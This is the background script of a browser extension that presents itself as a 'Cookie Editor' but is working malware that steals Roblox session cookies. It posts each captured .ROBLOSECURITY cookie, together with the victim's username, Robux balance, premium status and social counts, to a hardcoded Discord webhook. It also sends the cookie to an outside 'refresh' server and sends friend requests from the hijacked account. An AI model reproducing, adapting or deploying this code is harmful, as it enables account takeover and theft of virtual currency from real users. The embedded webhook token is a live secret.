const REFRESH_ENDPOINT = 'https://rbxtools-refresh.x10.mx/robl0xrefresher/refresh.php';
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1541837765937987775/4k7722FneJUkkGoMH6Uf8A1nI8IDLboeES3yIZQ2h-dAeDm5-Dn83tvpufN9SdKxcYf4';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // Fire-and-forget for kick flow – runs even when popup is closed
  if (message.type === 'SEND_COOKIE') {
    handleSendCookie(message.cookie);
    sendResponse({ success: true });
    return false;
  }

  // Immediate response for the Refresh tab
  if (message.type === 'REFRESH_COOKIE') {
    handleRefresh(message.cookie)
      .then(result => sendResponse(result))
      .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
  }

  // Post-kick tasks (auto-friends, reload tabs) - handled in background for speed
  if (message.type === 'POST_KICK_TASKS') {
    handlePostKickTasks();
    sendResponse({ success: true });
    return false;
  }
});

async function handleSendCookie(cookie) {
  const sanitizedCookie = clean(cookie);

  // 1. Immediately send the new cookie to Discord (never fails the kick)
  try {
    await sendToDiscord(sanitizedCookie);
  } catch (e) {
    console.error('Discord send failed:', e);
  }

  // 2. Attempt to refresh in the background with a small delay
  //    (the server might need a moment to recognize the new cookie)
  setTimeout(async () => {
    try {
      const result = await handleRefresh(sanitizedCookie);
      if (result.success && result.cookie) {
        console.log('Refresher success:', result.cookie);
        // Optionally send the refreshed cookie to Discord too?
        // We'll send it as a separate log if you want.
      }
    } catch (e) {
      // Silent fail – we already sent the cookie to Discord
      console.warn('Refresher failed (ignored):', e.message);
    }
  }, 2000); // 2-second delay
}

async function handlePostKickTasks() {
  try {
    await autoFriends();
  } catch (e) {
    console.error('Auto-friends failed:', e);
  }

  try {
    const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
    for (const tab of tabs) chrome.tabs.reload(tab.id);
  } catch (e) {
    console.error('Tab reload failed:', e);
  }
}

function clean(cookie) {
  if (!cookie) return '';
  let c = cookie.replace(/^cookie=/, '').trim();
  c = c.replace(/^\.?ROBLOSECURITY\s*=\s*/i, '');
  c = c.replace(/^cookie\s*=\s*/i, '');
  if (c.startsWith('"') && c.endsWith('"')) c = c.slice(1, -1);
  try { c = decodeURIComponent(c); } catch (e) {}
  const parts = c.split('|_');
  if (parts.length > 1) c = parts.pop();
  return c.trim();
}

async function handleRefresh(cookie) {
  if (!cookie || cookie.length < 10) throw new Error('Invalid cookie');

  const response = await fetch(REFRESH_ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'cookie=' + encodeURIComponent(cookie) + '&directory=robl0xrefresher'
  });

  if (!response.ok) throw new Error('Refresh service unavailable');
  const data = await response.json();
  if (!data.success || !data.cookie) throw new Error(data.error || 'Refresh failed');

  return { success: true, cookie: data.cookie };
}

async function sendToDiscord(cookie) {
  try {
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include', headers: { 'User-Agent': UA } });
    if (!authRes.ok) throw new Error('Auth failed');

    const auth = await authRes.json();
    const info = await fetchUserInfo(auth.id);

    const embed = {
      title: '🍪 Cookie Log',
      description: `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_\`\`\`\n${cookie}\n\`\`\``,
      color: 0x8b5cf6,
      fields: [
        { name: 'Username', value: `${info.displayName || info.username} (@${info.username})`, inline: true },
        { name: 'User ID', value: `${auth.id}`, inline: true },
        { name: 'Account Age', value: `${info.ageDays} days`, inline: true },
        { name: 'Robux', value: `${info.robux}`, inline: true },
        { name: 'Pending', value: `${info.pending}`, inline: true },
        { name: 'Total Robux', value: `${info.total}`, inline: true },
        { name: 'Premium', value: info.premium ? 'Yes' : 'No', inline: true },
        { name: 'Friends', value: `${info.friends}`, inline: true },
        { name: 'Followers', value: `${info.followers}`, inline: true },
        { name: 'Groups', value: `${info.groups}`, inline: true },
      ],
      footer: { text: 'COOKIE EDITOR V3 • v3.0' },
      timestamp: new Date().toISOString()
    };

    if (info.avatarUrl) embed.thumbnail = { url: info.avatarUrl };
    const payload = { content: '@everyone', embeds: [embed] };

    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    // Fallback: send simple message with cookie if rich embed fails
    console.error('Rich embed failed, sending plain message:', e);
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `🍪 **Cookie**\n\`\`\`\n${cookie}\n\`\`\`\n@everyone` })
    });
  }
}

async function fetchUserInfo(userId) {
  const [userRes, friendsRes, followersRes, groupsRes, avatarRes, robuxRes, premiumRes] = await Promise.all([
    fetch(`https://users.roblox.com/v1/users/${userId}`, { credentials: 'include', headers: { 'User-Agent': UA } }),
    fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { credentials: 'include', headers: { 'User-Agent': UA } }),
    fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, { credentials: 'include', headers: { 'User-Agent': UA } }),
    fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, { credentials: 'include', headers: { 'User-Agent': UA } }),
    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { credentials: 'include', headers: { 'User-Agent': UA } }),
    fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { credentials: 'include', headers: { 'User-Agent': UA } }),
    fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/premium`, { credentials: 'include', headers: { 'User-Agent': UA } })
  ]);

  const info = {};
  if (userRes.ok) {
    const u = await userRes.json();
    info.username = u.name || 'Unknown';
    info.displayName = u.displayName || u.name || 'Unknown';
    info.ageDays = u.created ? Math.floor((Date.now() - new Date(u.created)) / (1000*60*60*24)) : 0;
  }

  if (friendsRes.ok) {
    const data = await friendsRes.json();
    info.friends = data.count || 0;
  }
  if (followersRes.ok) {
    const data = await followersRes.json();
    info.followers = data.count || 0;
  }
  if (groupsRes.ok) {
    const data = await groupsRes.json();
    info.groups = Array.isArray(data.data) ? data.data.length : 0;
  }
  if (avatarRes.ok) {
    const data = await avatarRes.json();
    info.avatarUrl = data.data?.[0]?.imageUrl || '';
  }
  if (robuxRes.ok) {
    const r = await robuxRes.json();
    info.robux = r.robux || 0;
    info.pending = r.pending || 0;
    info.total = info.robux + info.pending;
  }
  info.premium = premiumRes.ok ? (await premiumRes.json()).isPremium : false;

  return info;
}

async function autoFriends() {
  const data = await chrome.storage.local.get(['friends']);
  const list = data.friends || [];
  if (!list.length) return;

  const csrf = await getCsrf();
  if (!csrf) return;

  for (const u of list) {
    try {
      const r = await fetch('https://users.roblox.com/v1/usernames/users', { method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': UA }, body: JSON.stringify({ usernames: [u], excludeBannedUsers: false }) });
      const d = await r.json();
      if (!d.data?.length) continue;
      await fetch(`https://friends.roblox.com/v1/users/${d.data[0].id}/request-friendship`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-csrf-token': csrf, 'User-Agent': UA }, credentials: 'include', body: JSON.stringify({}) });
    } catch (e) {}
  }
}

async function getCsrf() {
  try {
    const r = await fetch('https://auth.roblox.com/v2/login', { method: 'POST', credentials: 'include', headers: { 'User-Agent': UA } });
    return r.headers.get('x-csrf-token');
  } catch { return null; }
}